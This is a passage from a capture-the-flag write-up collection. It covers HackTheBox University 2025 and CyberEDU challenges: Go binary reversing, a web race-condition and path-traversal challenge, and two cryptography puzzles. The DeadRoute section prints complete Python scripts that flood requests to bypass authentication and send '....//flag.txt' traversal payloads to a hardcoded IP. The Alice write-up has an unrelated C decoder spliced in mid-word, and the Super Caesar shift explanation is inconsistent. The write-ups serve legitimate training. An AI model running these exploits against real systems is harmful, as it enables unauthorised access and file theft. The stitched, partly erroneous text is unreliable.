the binary in Ghidra and see that it finds a <code>main.main</code> symbol. This makes it clear that we are dealing with a Go compiled binary.</p> <p>Going into the <code>main</code> function, we see the following decompilation:</p> <pre><code>/* WARNING: Removing unreachable block (ram,0x010a6f0b) */\n/* ... (warnings truncated for brevity) ... */\n/* Name: main.main\n   Start: 010a6a60\n   End: 010a7200 */\n\nvoid main.main(void)\n\n{\n  undefined8 extraout_RAX;\n  undefined8 extraout_RAX_00;\n  runtime._type **pprVar1;\n  long unaff_R14;\n  undefined1 in_XMM15 [16];\n  undefined1 local_338 [96];\n\n  // ... [Variable Declarations Truncated] ...\n\n  os.File *local_10;\n\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:179 */\n  while (auStack_228[0] = in_XMM15._8_8_, local_338 &lt;= *(undefined1 **)(unaff_R14 + 0x10)) {\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:179 */\n    runtime.morestack_noctxt();\n  }\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:182 */\n  local_1d8 = &amp;_go:itab.main.R0,main.MemoryRune;\n  local_1d0 = &amp;runtime.zerobase;\n  local_1c8 = &amp;_go:itab.main.R1,main.MemoryRune;\n\n  // ... [Itab initializations for R2 through R27] ...\n\n  local_28 = &amp;_go:itab.main.R27,main.MemoryRune;\n  local_20 = &amp;runtime.zerobase;\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:188 */\n  local_10 = os.Stdin;\n\n  // ... [Buffer initialization] ...\n\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:190 */\n  local_298 = &amp;datatype.String.string;\n  local_290 = &amp;PTR_DAT_010fa010;\n                    /* /usr/local/Cellar/go/1.25.4/libexec/src/fmt/print.go:314 */\n  fmt.Fprintln(&amp;_go:itab.*os.File,io.Writer,os.Stdout,&amp;local_298,1,1);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:191 */\n  local_2a8 = &amp;datatype.String.string;\n  local_2a0 = &amp;goss_The_snowglobe_clouds..._Enter_the_scrambled_memory_to_restore_the_truth._10fa02 0;\n                    /* /usr/local/Cellar/go/1.25.4/libexec/src/fmt/print.go:314 */\n  fmt.Fprintln(&amp;_go:itab.*os.File,io.Writer,os.Stdout,&amp;local_2a8,1,1);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:192 */\n  local_2b8 = &amp;datatype.String.string;\n  local_2b0 = &amp;goss_&gt;__10fa030;\n                    /* /usr/local/Cellar/go/1.25.4/libexec/src/fmt/print.go:272 */\n  pprVar1 = &amp;local_2b8;\n  fmt.Fprint(&amp;_go:itab.*os.File,io.Writer,os.Stdout,pprVar1,1,1);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:194 */\n  bufio.(*Reader).ReadString(&amp;local_230,10);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:195 */\n  if (pprVar1 != (runtime._type **)0x0) {\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:196 */\n    local_2c8 = &amp;datatype.String.string;\n    local_2c0 = &amp;goss_The_memory_slipped_away..._10fa040;\n                    /* /usr/local/Cellar/go/1.25.4/libexec/src/fmt/print.go:314 */\n    fmt.Fprintln(&amp;_go:itab.*os.File,io.Writer,os.Stdout,&amp;local_2c8,1,1);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:197 */\n    return;\n  }\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:199 */\n  strings.TrimSpace(extraout_RAX_00,10);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:201 */\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:202 */\n  local_2d8 = &amp;datatype.String.string;\n  local_2d0 = &amp;goss_The_snowglobe_stays_cloudy._10fa050;\n                    /* /usr/local/Cellar/go/1.25.4/libexec/src/fmt/print.go:314 */\n  fmt.Fprintln(&amp;_go:itab.*os.File,io.Writer,os.Stdout,&amp;local_2d8,1,1);\n                    /* /Users/kailash/Documents/November/go-chal/challenge.go:203 */\n  return;\n}\n</code></pre> <p>We can see that much code is truncated by Ghidra. However, we see 27 references to <code>main.expected</code> and <code>main.match</code>. It is clear now that we are dealing with Go interfaces. This explains why the code appears truncated.</p> <p>Our goal is to find the 27 <code>main.expected</code> functions, which will likely contain the expected values for every position in the flag.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/#finding-the-shards","title":"Finding the Shards","text":"<p>Looking into the function window in Ghidra, we see exactly 27 functions:</p> <p>Going into the first one, <code>main.(*R0).Expected</code>, we see some strange code:</p> <pre><code>/* Name: main.(*R0).Expected\n   Start: 010a7200\n   End: 010a7240 */\n\nvoid main.(*R0).Expected(main.R0 *this)\n\n{\n  long *plVar1;\n  main.R0 *extraout_RAX;\n  long unaff_R14;\n\n                    /* &lt;autogenerated&gt;:1 */\n  plVar1 = *(long **)(unaff_R14 + 0x20);\n  if (plVar1 != (long *)0x0) goto LAB_010a721f;\n  while (this == (main.R0 *)0x0) {\n    runtime.panicwrap();\n    this = extraout_RAX;\nLAB_010a721f:\n    if ((undefined1 *)*plVar1 == &amp;stack0x00000008) {\n      *plVar1 = (long)&amp;stack0xfffffffffffffff8;\n    }\n  }\n  return;\n}\n</code></pre> <p>Again, the code is truncated by Ghidra. It should return the expected value, but it cannot be analyzed effectively in the decompilation view. To solve this, we will look straight into the assembly code of the function.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/#assembly-analysis","title":"Assembly Analysis","text":"<pre><code>                             *************************************************************\n                             * Name: main.(*R0).Expected                                 \n                             * Start: 010a7200                                           \n                             * End: 010a7240                                             \n                             *************************************************************\n                             void  __stdcall  main.(*R0).Expected (main.R0 * this )\n             void             &lt;VOID&gt;         &lt;RETURN&gt;\n             main.R0 *64      RAX:8          this\n                             &lt;autogenerated&gt;:1\n                             _main.(*R0).Expected                            XREF[2]:     main.main:010a70e7 (c) , \n                             main.(*R0).Expected                                          010fa838 (*)   \n        010a7200 55              PUSH       RBP\n        010a7201 48  89  e5       MOV        RBP ,RSP\n        010a7204 4d  8b  66  20    MOV        R12 ,qword ptr [R14  + 0x20 ]\n        010a7208 4d  85  e4       TEST       R12 ,R12\n        010a720b 75  12           JNZ        LAB_010a721f\n                             LAB_010a720d                                    XREF[2]:     010a7228 (j) , 010a722e (j)   \n        010a720d 48  85  c0       TEST       this ,this\n        010a7210 74  07           JZ         LAB_010a7219\n        010a7212 b8  48  00       MOV        this ,0x48\n                 00  00\n        010a7217 5d              POP        RBP\n        010a7218 c3              RET\n                             LAB_010a7219                                    XREF[1]:     010a7210 (j)   \n        010a7219 e8  42  73       CALL       runtime.panicwrap                                void runtime.panicwrap(void)\n                 f6  ff\n        010a721e 90              NOP\n                             LAB_010a721f                                    XREF[1]:     010a720b (j)   \n        010a721f 4c  8d  6c       LEA        R13 =&gt;Stack [0x8 ],[RSP  + 0x10 ]\n                 24  10\n        010a7224 4d  39  2c  24    CMP        qword ptr [R12 ],R13\n        010a7228 75  e3           JNZ        LAB_010a720d\n        010a722a 49  89  24  24    MOV        qword ptr [R12 ],RSP\n        010a722e eb  dd           JMP        LAB_010a720d\n        010a7230 cc              ??         CCh\n        ... (padding) ...\n</code></pre> <p>And bingo, we can see the key instruction:</p> <pre><code>010a7212 b8 48 00    MOV    this, 0x48\n         00 00\n</code></pre> <p>This is the value on the first position: 0x48.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/#solution","title":"Solution","text":"<p>We repeat the process for every function (R0 through R26), gather all the hex values, put them together, and then transform them to ASCII. This reveals the flag.</p>"},{"location":"HackTheBox-University2025/web/dead_route/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/web/dead_route/description/#deadroute","title":"DeadRoute","text":"<p>Description: Welcome to the Tinselwick Sticky Notes board! Unfortunately, the Town Clerk implemented a new routing system that has locked everyone out of the admin panel. The Grinch\u2019s 'paywall of spells' logic is spreading, preventing the town's wishes from coming true. We need you to bypass the blocked routes, retrieve the emergency override code, and stop the corrupted festive code.</p>"},{"location":"HackTheBox-University2025/web/dead_route/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>We are provided with the source code for a Go binary. A review reveals two critical vulnerabilities:</p>"},{"location":"HackTheBox-University2025/web/dead_route/description/#1-race-condition-in-middleware-auth-bypass","title":"1. Race Condition in Middleware (Auth Bypass)","text":"<p>The custom router implementation (<code>models/router.go</code>) contains a race condition in how it handles middleware slices.</p> <ul> <li>The Flaw: In Go, a slice is a header containing a pointer to an underlying array, a length, and a capacity. In the route handler, the code copies the slice header (<code>mws := r.mws</code>) but shares the underlying array.</li> <li>The Race: When <code>append</code> is called inside the closure, it writes to this shared underlying array. If multiple requests happen simultaneously (e.g., a public route vs. a private route), one request can overwrite the middleware of the other.</li> <li>The Exploit: By flooding a public route (like <code>/login</code>), we can \"pollute\" the shared array. Simultaneously requesting <code>/admin</code> gives us a chance to execute the request after the <code>RequireAuth</code> middleware has been overwritten by a non-blocking handler from the public route.</li> </ul>"},{"location":"HackTheBox-University2025/web/dead_route/description/#2-file-path-traversal","title":"2. File Path Traversal","text":"<p>The application attempts to sanitize file paths using a weak filter:</p> <pre><code>noteID = strings.ReplaceAll(noteID, \"../\", \"\")\n</code></pre> <ul> <li>The Flaw: <code>strings.ReplaceAll</code> is not recursive; it only removes the substring once.</li> <li>The Bypass: An attacker can construct a payload like <code>....//</code>.</li> <li>The filter finds the inner <code>../</code> (indexes 2-4) and removes it.</li> <li> <p>The remaining characters collapse to form <code>../</code>.</p> </li> <li> <p>Impact: This allows reading arbitrary files on the system (e.g., <code>flag.txt</code>) via the <code>ReadNote</code> function.</p> </li> </ul>"},{"location":"HackTheBox-University2025/web/dead_route/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox-University2025/web/dead_route/description/#step-1-bypassing-authentication","title":"Step 1: Bypassing Authentication","text":"<p>We use a threaded Python script to trigger the race condition. \"Polluter\" threads hit <code>/login</code> to trigger the unsafe <code>append</code> and modify the shared memory, while \"Checker\" threads spam <code>/admin</code> attempting to access the dashboard without authentication.</p> <p>Exploit Script (<code>race_bypass.py</code>):</p> <pre><code>import requests\nimport threading\nimport sys\n\n# TARGET IP from your challenge\nTARGET = \"http://154.57.164.76:32079\"\n\n# Shared flag to stop threads once we win\nstop_threads = False\n\ndef pollution_worker(sess):\n    \"\"\"\n    Sends requests to a public endpoint (/login).\n    This tries to overwrite the shared middleware slot with a standard handler\n    that DOES NOT block execution (unlike RequireAuth).\n    \"\"\"\n    global stop_threads\n    while not stop_threads:\n        try:\n            # We use /login because it's a valid public route\n            sess.get(f\"{TARGET}/login\")\n        except:\n            pass\n\ndef admin_worker(sess):\n    \"\"\"\n    Spams the admin endpoint.\n    If the race succeeds, RequireAuth is replaced by LoginHandler.\n    The server will return 200 OK and likely the Dashboard content mixed with Login content.\n    \"\"\"\n    global stop_threads\n    while not stop_threads:\n        try:\n            resp = sess.get(f\"{TARGET}/admin\")\n\n            # If we bypassed auth, we won't get redirected to /login\n            if \"Dashboard\" in resp.text or \"Welcome\" in resp.text:\n                print(f\"\\n[+] BOOM! Auth Bypassed!\")\n                print(f\"[+] Response length: {len(resp.text)}\")\n                print(\"-\" * 30)\n                # Dump a snippet of the body to see the flag/token\n                print(resp.text[:500]) \n                print(\"-\" * 30)\n                stop_threads = True\n                return\n            elif resp.status_code == 200 and \"Login\" not in resp.text:\n                # Catch-all for success\n                print(f\"\\n[+] Possible hit! Status 200\")\n                print(resp.text)\n                stop_threads = True\n        except:\n            pass\n\ndef main():\n    print(f\"[*] Starting Race Condition exploit against {TARGET}\")\n    print(\"[*] Spawning threads... (Ctrl+C to stop manually)\")\n\n    # Use a session for connection pooling (faster requests)\n    sess = requests.Session()\n\n    threads = []\n\n    # Spawn \"Polluters\" (create the noise)\n    for _ in range(10):\n        t = threading.Thread(target=pollution_worker, args=(sess,))\n        t.daemon = True\n        t.start()\n        threads.append(t)\n\n    # Spawn \"Checkers\" (try to enter admin)\n    for _ in range(10):\n        t = threading.Thread(target=admin_worker, args=(sess,))\n        t.daemon = True\n        t.start()\n        threads.append(t)\n\n    try:\n        while not stop_threads:\n            pass\n    except KeyboardInterrupt:\n        print(\"\\n[*] Stopping...\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Running this script grants us access to the dashboard, where we can retrieve the admin session cookie (or token) required for the next step.</p>"},{"location":"HackTheBox-University2025/web/dead_route/description/#step-2-reading-the-flag","title":"Step 2: Reading the Flag","text":"<p>With the admin cookie (mocked here as <code>santa_auth</code>), we target the <code>/admin/notes/read</code> endpoint. We inject the <code>....//</code> payload into the <code>id</code> parameter to traverse the directory structure and read <code>flag.txt</code>.</p> <p>Exploit Script (<code>get_flag.py</code>):</p> <pre><code>import requests\nimport sys\nimport json\n\n# Usage: python3 get_flag.py &lt;COOKIE_VALUE&gt;\nif len(sys.argv) &lt; 2:\n    print(\"Usage: python3 get_flag.py &lt;COOKIE_VALUE&gt;\")\n    sys.exit(1)\n\n# Configuration\nCOOKIE_VALUE = sys.argv[1]\nTARGET_IP = \"http://154.57.164.76:32079\"\nURL = f\"{TARGET_IP}/admin/notes/read\"\n\nprint(f\"[*] Attacking with cookie: {COOKIE_VALUE[:10]}...\")\n\n# 1. Setup Session\nsession = requests.Session()\nsession.cookies.set(\"santa_auth\", COOKIE_VALUE)\n\n# 2. Define Payloads\n# The base directory is 'notes/', so we need to go up to find the flag.\n# We use the filter bypass: \"....//\" -&gt; \"../\"\npayloads = [\n    \"....//flag.txt\",               # Flag in app root\n    \"....//flag\",                   # Flag in app root (no extension)\n    \"....//....//flag.txt\",         # Flag in parent\n    \"....//....//....//flag.txt\",   # Flag in system root\n]\n\n# 3. Hunt for the flag\nfor payload in payloads:\n    print(f\"[*] Trying payload: {payload}\")\n    try:\n        # The 'id' parameter is where the traversal happens\n        resp = session.get(URL, params={\"id\": payload})\n\n        if resp.status_code == 200:\n            try:\n                data = resp.json()\n                # The code treats the first line of the file as the \"Title\"\n                content = data.get('title', '') + \"\\n\" + data.get('content', '')\n\n                if \"HTB\" in content or \"flag\" in content.lower():\n                    print(\"\\n\" + \"!\" * 40)\n                    print(f\"[+] FLAG FOUND at {payload}!\")\n                    print(\"!\" * 40)\n                    print(content.strip())\n                    print(\"!\" * 40)\n                    sys.exit(0)\n                else:\n                    print(f\"[+] File found, but no flag. Content: {content[:50]}...\")\n            except:\n                print(f\"[+] Raw response (not JSON): {resp.text[:100]}\")\n        elif resp.status_code == 404:\n            print(\"[-] File not found\")\n        elif resp.status_code == 403:\n            print(\"[-] Auth failed (Cookie invalid?)\")\n            sys.exit(1)\n\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n</code></pre> <p>Executing this script retrieves the flag content from the server.</p> <p>Also here is a detailed image showing the race condition memory corruption. </p>"},{"location":"cyberedu/","title":"CyberEDU Challenges","text":"<p>This directory contains writeups for various CyberEDU platform challenges organized by category.</p>"},{"location":"cyberedu/#cryptography","title":"Cryptography","text":"Challenge Description Alice Cryptographic challenge super_caesar Caesar cipher variant train-to-paddington Padding oracle attack"},{"location":"cyberedu/#forensics","title":"Forensics","text":"Challenge Description east Digital forensics investigation victim Incident analysis challenge zanger Forensic artifact extraction"},{"location":"cyberedu/#misc","title":"Misc","text":"Challenge Description alien-console Miscellaneous challenge"},{"location":"cyberedu/#pwn","title":"Pwn","text":"Challenge Description baby-fmt Format string vulnerability baby_rop Return-oriented programming bazooka Binary analysis challenge blindsight Blind ROP exploitation cache Heap exploitation challenge can-you-jump Control flow manipulation cookie Stack canary bypass honeypot Race condition &amp; RNG prediction off Heap / Off-by-one exploitation secret Format string &amp; ROP chain threadz Thread Local Storage (TLS) exploitation virtual VM escape &amp; OOB write gentei House of spirit bss crawling + fastbin check bypass and hook overwrite"},{"location":"cyberedu/#reverse-engineering","title":"Reverse Engineering","text":"Challenge Description mathematics Algorithm reverse engineering strange-puzzle Puzzle reverse engineering"},{"location":"cyberedu/#steganography","title":"Steganography","text":"Challenge Description coffee-time Hidden data extraction flag-is-hidden Steganography challenge"},{"location":"cyberedu/#web","title":"Web","text":"Challenge Description http-for-pros HTTP protocol exploitation reccon Web reconnaissance challenge ultra-crawl Web crawling and analysis <p>Total Challenges: 22 Categories: Cryptography, Forensics, Misc, Pwn, Reverse Engineering, Steganography, Web</p> <p>Back to Main Repository</p>"},{"location":"cyberedu/cryptography/Alice/description/","title":"Alice - CTF Writeup","text":"<p>Challenge Name: Alice</p>"},{"location":"cyberedu/cryptography/Alice/description/#description","title":"Description","text":"<p>To use her e-mail, Alice needs to connect to a mail server. The authentication is unilateral, and works as follows:</p> <ol> <li>Alice requests access to the server by sending her username.</li> <li>The server randomly selects 2 values <code>index1</code> and <code>index2</code> (<code>1 &lt;= index1 &lt; index2 &lt;= 64</code>), and challenges Alice with <code>(index1, index2)</code>.</li> <li>Alice applies SHA256 to her password, keeps the hex characters placed on the positions <code>index1</code> and <code>index2</code> unchanged and changes all the other hex characters to a different value. Then, she sends the result to the server.</li> <li>The server receives the response, and checks if the received string equals the SHA256 value stored in the database for Alice's username in exactly two positions: <code>index1</code> and <code>index2</code>.</li> <li>To decrease the chances to obtain access by luck, the server repeats the procedure and sends several requests to Alice before allowing her to access the e-mail. If Alice replies correctly to all challenges, then she is successfully authenticated; if not, Alice is denied access.</li> </ol>"},{"location":"cyberedu/cryptography/Alice/description/#example","title":"Example","text":"<ul> <li>Username: <code>Alice</code></li> <li>Password: <code>ageneralpassword</code></li> <li>SHA256(password): <code>aad3eda32ce777fa1cb3ca97ac7e1bfdd726053e05e0109b3526a63fed4519b7</code></li> <li>index1 = 5 and index2 = 60</li> </ul> <p>Valid reply (only hex characters on positions 5 and 60 are unchanged): <pre><code>4c77ef3010c2f5c274ebbb0ff5abe001eeb5ce0f944dd1402caaf9ddx475bffe\n</code></pre></p> <p>Invalid reply (hex characters on positions 9 and 57 are also the same): <pre><code>4c77ef3020c2f5c274ebbb0ff5abe001eeb5ce0f944dd1402caaf9dde475bffe\n</code></pre></p> <p>Invalid reply (hex character on position 5 is different): <pre><code>4c77ff3010c2f5c274ebbb0ff5abe001eeb5ce0f944dd1402caaf9ddx475bffe\n</code></pre></p>"},{"location":"cyberedu/cryptography/Alice/description/#challenge-scenario","title":"Challenge Scenario","text":"<p>An adversary masquerades as the server, and fools Alice into replying to his challenges. You are not given access to the challenges, but you know that: - The adversary only queried positions from the first half of the hash - You have all the replies from Alice in <code>Alice_replies.txt</code> - The adversary found the complete hash - This hash is your flag</p>"},{"location":"cyberedu/cryptography/Alice/description/#given-data","title":"Given Data","text":"<p>We are provided with the following ciphertexts (Alice's replies):</p> <pre><code>f14fd2705fa37ce36ab73472883cf329917c50eb06d2080f863fd6bf712377b1\nad3b393e6426aef4db1a49180797393a3cb6a7516d1b5f69a3d36138d9be121c\n73c370746eb072da5deb8ce13febaa16d33dc714c24a8424018a8a16f46cbdcf\n05bac2205f124251c03863a608322b5486c2ba8c1fe0fbaccb1942ed838deb30\n312f3b3ef4ce5ef837b1c9837ba8f9ba6f6f21f73eff19ea39e105a1604c61fe\n983bd1838b16b697c90731e7602c1a1ce44f4c62032a32f2dfaa50f638f14925\n7ec14b2e54a24a7150f121468b5dabb47dd3eb0fbb13ea33b8f7dc171d9fc8ed\n313f4b83fbbe56da3a34c0e13fa2e55cf5e5592344c4297b122899629e5290d3\n98b1c1348423aa782838204775281aff2e5432782539d3832aa2142b0ca92a34\ndc2bc85fa5302c51e919bb59d6eb27dc2a0004b9d867b7505e6528435a16a58a\nfe0e584025c1816621aa3c745971c9d9c299733e897d51d6f54cb79ac3770f08\n7561b7a5a2348c8bed05b7c9f6e4332718188dc8e0919d1e90bdced42be58476\nadc3d4612bd6215627a94b58579ba789003a6faa97566c257d56fdc9a2603290\n012f795543d1be84f81584c23b3123365187d52d7abe46cd44c073558534fe62\n734ac4a39ee5bc9b6d044c19d9e7c386b7a198d6f188ce48ef04ed0e47d8f35b\n3563504f92d40f67f1f8c7a4f57437274b2b1690ad0570b11c9b3f80e6cb5ca7\n</code></pre>"},{"location":"cyberedu/cryptography/Alice/description/#solution-strategy","title":"Solution Strategy","text":"<p>There are 16 ciphertexts - not an odd number at all! Why 16? Because 16 is the number of hex digits: <code>0-9</code> and <code>A-F</code>.</p> <p>After I counted 16 ciphertexts, I knew exactly what the strategy was:</p>"},{"location":"cyberedu/cryptography/Alice/description/#the-key-insight","title":"The Key Insight","text":"<p>The adversary crafted exactly 16 challenges, one for each possible hex digit. For each challenge: - The adversary queried the same position in the hash - Alice changed all hex characters except the ones at the quer### C Exploit</p> <p>Here\u2019s the C exploit for the challenge:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n\nvoid reverse_obfuscation(unsigned char *data, int length, unsigned int seed)\n{\n    srand(seed);\n\n    for (int i = 0; i &lt; length; i++)\n    {\n        int iVar1 = rand();\n        int local_3c = rand();\n        local_3c = local_3c &amp; 7;\n\n        data[i] = (data[i] &gt;&gt; local_3c) | (data[i] &lt;&lt; (8 - local_3c));\n\n        data[i] = data[i] ^ (unsigned char)iVar1;\n    }\n}\n\nint main()\n{\n    FILE *f = fopen(\"flag.enc\", \"rb\");\n    if (!f)\n    {\n        printf(\"Cannot open file.enc\\n\");\n        return 1;\n    }\n\n    fseek(f, 0, SEEK_END);\n    long file_size = ftell(f);\n    fseek(f, 0, SEEK_SET);\n\n    unsigned char *data = malloc(file_size);\n    fread(data, 1, file_size, f);\n    fclose(f);\n\n    unsigned int seed = *(unsigned int *)data; // automatically gets the first 4 bytes while casting to unsigned int because unsigned int takes 4 bytes\n    printf(\"Seed: %u (0x%08X)\\n\", seed, seed);\n\n    int flag_length = file_size - 4;\n    reverse_obfuscation(data + 4, flag_length, seed);\n\n    printf(\"Flag: \");\n    for (int i = 0; i &lt; flag_length; i++)\n    {\n        printf(\"%c\", data[4 + i]);\n    }\n    printf(\"\\n\");\n\n    free(data);\n    return 0;\n}\n</code></pre> <p>---ied positions - By analyzing which hex digit appears exactly once (unchanged) or doesn't appear at all, we can determine the original hash character at that position</p>"},{"location":"cyberedu/cryptography/Alice/description/#algorithm","title":"Algorithm","text":"<ol> <li>For the first half of the hash (positions queried by the adversary):</li> <li>Analyze each position across all 16 replies</li> <li>Find the hex digit that appears only once at that position</li> <li> <p>This is the original character from Alice's password hash</p> </li> <li> <p>For the second half of the hash (positions NOT queried):</p> </li> <li>Analyze each position across all 16 replies</li> <li>Find the hex digit that doesn't appear at that position</li> <li>This is the original character from Alice's password hash (Alice never changed it, so it never appears in the modified replies)</li> </ol>"},{"location":"cyberedu/cryptography/Alice/description/#example_1","title":"Example","text":"<p>For the first position across all 16 ciphertexts: <pre><code>f, a, 7, 0, 3, 9, 7, 3, 9, d, f, 7, a, 0, 7, 3\n</code></pre></p> <p>If we count the occurrences and find that <code>d</code> appears only once, then <code>d</code> is the first character of the original hash.</p> <p>For a position in the second half (not queried), if we find that the digit <code>5</code> never appears across all 16 replies at that position, then <code>5</code> is the original character.</p>"},{"location":"cyberedu/cryptography/Alice/description/#implementation","title":"Implementation","text":"<p>By applying this analysis to all 64 positions: - Positions 1-32 (first half): Extract the character that appears exactly once - Positions 33-64 (second half): Extract the character that never appears</p> <p>This reconstructs Alice's password hash, which is the flag.</p> <p>A full exploit implementation is available in this repository.</p>"},{"location":"cyberedu/cryptography/Alice/description/#python-exploit","title":"Python Exploit","text":"<p>Here\u2019s the python exploit for the challenge:</p> <pre><code>from collections import Counter\n\n# List of hashes\nhashes = [\n    \"f14fd2705fa37ce36ab73472883cf329917c50eb06d2080f863fd6bf712377b1\",\n    \"ad3b393e6426aef4db1a49180797393a3cb6a7516d1b5f69a3d36138d9be121c\",\n    \"73c370746eb072da5deb8ce13febaa16d33dc714c24a8424018a8a16f46cbdcf\",\n    \"05bac2205f124251c03863a608322b5486c2ba8c1fe0fbaccb1942ed838deb30\",\n    \"312f3b3ef4ce5ef837b1c9837ba8f9ba6f6f21f73eff19ea39e105a1604c61fe\",\n    \"983bd1838b16b697c90731e7602c1a1ce44f4c62032a32f2dfaa50f638f14925\",\n    \"7ec14b2e54a24a7150f121468b5dabb47dd3eb0fbb13ea33b8f7dc171d9fc8ed\",\n    \"313f4b83fbbe56da3a34c0e13fa2e55cf5e5592344c4297b122899629e5290d3\",\n    \"98b1c1348423aa782838204775281aff2e5432782539d3832aa2142b0ca92a34\",\n    \"dc2bc85fa5302c51e919bb59d6eb27dc2a0004b9d867b7505e6528435a16a58a\",\n    \"fe0e584025c1816621aa3c745971c9d9c299733e897d51d6f54cb79ac3770f08\",\n    \"7561b7a5a2348c8bed05b7c9f6e4332718188dc8e0919d1e90bdced42be58476\",\n    \"adc3d4612bd6215627a94b58579ba789003a6faa97566c257d56fdc9a2603290\",\n    \"012f795543d1be84f81584c23b3123365187d52d7abe46cd44c073558534fe62\",\n    \"734ac4a39ee5bc9b6d044c19d9e7c386b7a198d6f188ce48ef04ed0e47d8f35b\",\n    \"3563504f92d40f67f1f8c7a4f57437274b2b1690ad0570b11c9b3f80e6cb5ca7\"\n]\n\n# Verify all hashes have the same length\nhash_length = len(hashes[0])\nassert all(len(h) == hash_length for h in hashes), \"All hashes must have the same length\"\n\nprint(f\"Analyzing {len(hashes)} hashes of length {hash_length}\")\nprint(\"=\" * 60)\n\n# All possible hexadecimal characters\nall_hex_chars = set('0123456789abcdef')\n\n# Analyze each position\nunique_chars_by_position = {}\n\nfor position in range(hash_length):\n    # Extract character at this position from all hashes\n    chars_at_position = [h[position] for h in hashes]\n\n    # Count occurrences of each character\n    char_counts = Counter(chars_at_position)\n\n    if position &lt; 32:\n        # For positions 0-31: Find characters that appear exactly once\n        unique_chars = [char for char, count in char_counts.items() if count == 1]\n    else:\n        # For positions 32+: Find characters that don't appear at all\n        chars_present = set(chars_at_position)\n        unique_chars = sorted(list(all_hex_chars - chars_present))\n\n    if unique_chars:\n        unique_chars_by_position[position] = unique_chars\n\n# Display results\nprint(\"\\nPositions with unique characters (appearing only once):\")\nprint(\"-\" * 60)\n\nfor position in sorted(unique_chars_by_position.keys()):\n    unique_chars = unique_chars_by_position[position]\n    print(f\"Position {position:2d}: {', '.join(unique_chars)}\")\n\n# Summary\nprint(\"\\n\" + \"=\" * 60)\nprint(f\"Total positions analyzed: {hash_length}\")\nprint(f\"Positions with unique characters: {len(unique_chars_by_position)}\")\n\n# Optional: Build a string from all unique characters in order\nif unique_chars_by_position:\n    print(\"\\n\" + \"=\" * 60)\n    print(\"Concatenated unique characters (in position order):\")\n    result = \"\"\n    for position in sorted(unique_chars_by_position.keys()):\n        result += \"\".join(unique_chars_by_position[position])\n    print(result)\n</code></pre>"},{"location":"cyberedu/cryptography/Alice/description/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Frequency Analysis: The solution relies on analyzing character frequency across multiple samples</li> <li>Protocol Weakness: The authentication protocol leaks information when an adversary can control the challenges</li> <li>Clever Data Structure: The adversary used exactly 16 challenges (one per hex digit) to maximize information leakage</li> <li>Two-Phase Analysis: Different strategies for queried vs non-queried positions</li> </ul>"},{"location":"cyberedu/cryptography/super_caesar/description/","title":"Description","text":""},{"location":"cyberedu/cryptography/super_caesar/description/#challenge-super-caesar","title":"Challenge: Super Caesar","text":"<p>Type: Cryptography</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#initial-analysis","title":"Initial Analysis","text":"<p>We're given an encrypted message with three distinct parts: <pre><code>bcjac ---YnuNmQPGhQWqCXGUxuXnFVqrUVCUMhQdaHuCIrbDIcUqnKxbPORYTzVCDBlmAqtKnEJcpED --- UVQR\n</code></pre></p> <p>The challenge name suggests this involves Caesar cipher variations.</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#step-1-analyze-the-boundary-markers","title":"Step 1: Analyze the Boundary Markers","text":"<p>Looking at the first and last parts: - <code>bcjac</code> \u2192 appears to be \"start\" shifted - <code>UVQR</code> \u2192 appears to be \"STOP\" shifted</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#step-2-determine-shift-values","title":"Step 2: Determine Shift Values","text":"<p>Through trial or frequency analysis: - bcjac: \"start\" shifted 17 positions forward   - To decrypt: shift 9 positions backward (26 - 17 = 9) - UVQR: \"STOP\" shifted 24 positions forward    - To decrypt: shift 2 positions backward (26 - 24 = 2)</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#step-3-key-observation","title":"Step 3: Key Observation","text":"<p>The crucial insight is that: - Lowercase letters use a 9-position shift - Uppercase letters use a 2-position shift</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#step-4-solution-implementation","title":"Step 4: Solution Implementation","text":"<pre><code>def main():\n    s = bytearray(b'bcjac --- YnuNmQPGhQWqCXGUxuXnFVqrUVCUMhQdaHuCIrbDIcUqnKxbPORYTzVCDBlmAqtKnEJcpED --- UVQR')\n\n    # Split the message into three parts\n    k1, s, k2 = s.split(b' --- ')\n\n    # Decrypt the middle section with different shifts based on case\n    for i in range(len(s)):\n        c = s[i]\n        if 65 &lt;= c &lt;= ord('Z'):  # Uppercase letters\n            c = 65 + ((c - 65) - 2) % 26  # Shift back by 2\n        else:  # Lowercase letters\n            c = 97 + ((c - 97) - 9) % 26  # Shift back by 9\n        s[i] = c\n\n    print(s.decode())\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"cyberedu/cryptography/super_caesar/description/#step-5-result","title":"Step 5: Result","text":"<p>Running the script reveals the decrypted flag.</p>"},{"location":"cyberedu/cryptography/super_caesar/description/#key-learning-points","title":"Key Learning Points:","text":"<ol> <li>Multi-shift Caesar ciphers - Different parts of text can use different shift values</li> <li>Case sensitivity in cryptography - Uppercase and lowercase letters may have different treatments</li> <li>Boundary analysis - Start/stop markers often provide clues about 